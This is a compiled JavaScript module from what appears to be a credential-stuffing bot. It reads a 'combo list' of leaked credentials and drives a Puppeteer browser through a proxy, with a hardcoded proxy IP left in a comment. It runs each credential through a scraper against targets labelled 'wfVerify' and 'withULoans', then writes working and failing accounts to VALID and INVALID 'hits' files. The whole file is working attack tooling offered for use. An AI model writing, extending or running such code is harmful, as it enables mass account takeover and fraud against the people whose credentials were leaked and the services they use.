"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.runWebScraping = void 0;
const puppeteer_1 = __importDefault(require("puppeteer"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const chunk_1 = __importDefault(require("lodash/chunk"));
const logger_1 = __importDefault(require("./logger/logger"));
const utils_1 = require("./utils");
const getCredentialInformationScrapper_1 = require("./getCredentialInformationScrapper");
const constants_1 = require("./constants");
const get_bot_config_1 = require("./utils/get-bot-config");
const GROUP_PER_PARTIAL_CREDENTIAL = 1;
const CHANGE_TABS_SECONDS = 3;
const BLANK_PAGE_URL = 'about:blank';
const HITS_FOLDER = 'hits';
const HITS_FULL_DIRECTORY = `/data/${HITS_FOLDER}`;
// export const HEADLESS = false;
// export const proxyConfig = {
//   host: '169.197.82.58',
//   port: 28081,
// };
const runWebScraping = async (time, comboListFileName) => {
    const botConfig = await (0, get_bot_config_1.getBotConfig)();
    const HEADLESS = botConfig.openBrowser === 'yes' ? false : 'new';
    const proxyConfig = {
        host: botConfig.proxy.split(':')[0],
        port: botConfig.proxy.split(':')[1],
    };
    const browser = await puppeteer_1.default.launch({
        headless: HEADLESS,
        // headless: false,
        args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
    });
    try {
        const credentials = await (0, utils_1.getCredentials)(comboListFileName);
        console.log(credentials.slice(0, 10));
        // return;
        const partialCredentialsChunkSize = 1000;
        const partialCredentials = (0, chunk_1.default)(credentials, partialCredentialsChunkSize);
        /**
         * LOGS for combo list informations
         */
        logger_1.default.warn(`TOTAL CREDENTIALS: ${credentials.length}`);
        logger_1.default.warn(`PARTIAL_CREDENTIAL_SCHUNK_SIZE: ${partialCredentialsChunkSize}`);
        logger_1.default.warn(`QUANTITY OF PARTIAL_CREDENTIALS: ${partialCredentials.length}`);
        logger_1.default.warn(`GROUP_PER_PARTIAL_CREDENTIAL: ${GROUP_PER_PARTIAL_CREDENTIAL}`);
        logger_1.default.warn(`CHANGE_TABS_SECONDS: ${CHANGE_TABS_SECONDS}`);
        logger_1.default.warn(`TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES: ${constants_1.TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES}`);
        logger_1.default.warn(`TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES: ${constants_1.TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES}`);
        /**
         * END LOGS for combo list informations
         */
        let lastPageSelectedIndex = 0;
        const intervalChangeTabs = !HEADLESS
            ? setInterval(async () => {
                const pages = await browser.pages();
                const pagesWithoutEmpty = pages.filter((page) => page.url() !== BLANK_PAGE_URL);
                if (lastPageSelectedIndex >= pagesWithoutEmpty.length) {
                    lastPageSelectedIndex = 0;
                }
                let currentPage = pagesWithoutEmpty[lastPageSelectedIndex];
                if (currentPage) {
                    console.log(`pages quantity: ${pagesWithoutEmpty.length}`);
                    currentPage.bringToFront();
                    console.log(`bringToFront applied to page with URL: ${currentPage.url()} TAB_INDEX: ${lastPageSelectedIndex + 1}`);
                }
                lastPageSelectedIndex++;
            }, CHANGE_TABS_SECONDS * 1000)
            : undefined;
        logger_1.default.warn('STARTING BOT...');
        for (let index = 0; index < partialCredentials.length; index++) {
            // 1000 credentials per file
            const currentPartialCredential = partialCredentials[index];
            const VALID_PREFIX_FILE = `${comboListFileName} [`;
            const INVALID_PREFIX_FILE = `${comboListFileName} [`;
            const FILE_EXTENSION = '.txt';
            const validFileNameRange = `${(0, utils_1.getFileNameRange)(VALID_PREFIX_FILE, index, partialCredentialsChunkSize, credentials.length)}] VALID ${time}`;
            const invalidFileNameRange = `${(0, utils_1.getFileNameRange)(INVALID_PREFIX_FILE, index, partialCredentialsChunkSize, credentials.length)}] INVALID ${time}`;
            const dirname = process.cwd();
            const validFileDirectory = path_1.default.join(`${dirname}${HITS_FULL_DIRECTORY}`);
            const invalidFileDirectory = path_1.default.join(`${dirname}${HITS_FULL_DIRECTORY}`);
            if (!fs_1.default.existsSync(validFileDirectory)) {
                fs_1.default.mkdirSync(validFileDirectory, { recursive: true });
            }
            const validFilePath = path_1.default.join(validFileDirectory, `${validFileNameRange}${FILE_EXTENSION}`);
            const invalidFilePath = path_1.default.join(invalidFileDirectory, `${invalidFileNameRange}${FILE_EXTENSION}`);
            const validWritableStream = fs_1.default.createWriteStream(validFilePath, 'utf8');
            const invalidWritableStream = fs_1.default.createWriteStream(invalidFilePath, 'utf8');
            validWritableStream.on('error', (error) => {
                logger_1.default.error(`ERROR WHILE WRITING FILE: ${error}`);
                throw `Error while writing file [${validFilePath}]: ${error}`;
            });
            invalidWritableStream.on('error', (error) => {
                logger_1.default.error(`ERROR WHILE WRITING FILE: ${error}`);
                throw `Error while writing file [${invalidFilePath}]: ${error}`;
            });
            const validWriteLineOnFile = (line) => {
                validWritableStream.write(`${line}\r\n`, 'utf8');
            };
            const invalidWriteLineOnFile = (line) => {
                invalidWritableStream.write(`${line}\r\n`, 'utf8');
            };
            logger_1.default.warn(`Starting to insert credentials on file ${validFileNameRange}...`, (0, utils_1.getFileNameRange)(VALID_PREFIX_FILE, index, partialCredentialsChunkSize, credentials.length));
            const credentialsChunks = (0, chunk_1.default)(credentials, GROUP_PER_PARTIAL_CREDENTIAL);
            for (const credentialChunk of credentialsChunks) {
                try {
                    await Promise.all(credentialChunk.map(async (credential) => {
                        await Promise.all([
                            (0, getCredentialInformationScrapper_1.getCredentialInformationScrapper)(browser, credential, validWriteLineOnFile, invalidWriteLineOnFile, validFileNameRange, 'wfVerify'),
                            // getCredentialInformationScrapper(
                            //   browser,
                            //   credential,
                            //   validWriteLineOnFile,
                            //   invalidWriteLineOnFile,
                            //   validFileNameRange,
                            //   'withULoans',
                            // ),
                        ]);
                    }));
                }
                catch (error) {
                    logger_1.default.error(`ERROR ON FOR OF: ${error}`);
                }
            }
        }
        if (intervalChangeTabs) {
            clearInterval(intervalChangeTabs);
        }
    }
    catch (error) {
        logger_1.default.error(`ERROR ON HEAD WEB SCRAPING: ${error}`);
        console.error(error);
        await browser.close();
    }
};
exports.runWebScraping = runWebScraping;
